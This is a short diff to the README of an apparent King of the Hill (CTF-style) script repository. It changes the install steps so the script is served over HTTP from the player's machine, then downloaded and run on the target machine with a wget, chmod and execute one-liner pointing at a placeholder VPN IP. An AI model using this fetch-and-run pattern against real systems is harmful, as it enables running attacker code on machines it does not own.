@@ -17,16 +17,12 @@ The KOTH Script is a powerful tool created by H3X-007 to ensure that you are the
        git clone https://github.com/H3X-007/KOTH-Scripts.git
 
 2. Change directory
+       
+       cd KOTH-Scripts && python3 -m http.server 80
 
-       cd KOTH-Scripts
-
-3. Make the script executable.
+3. In KOTH Machine.
   
-       chmod +x KOTH.sh
-   
-4. Run the script.
-  
-       ./KOTH.sh   
+       wget http://YOUR-VPN-IP/KOTH.sh && chmod +x KOTH.sh && ./KOTH.sh
 
 4. Enter your desired nickname when prompted.
 
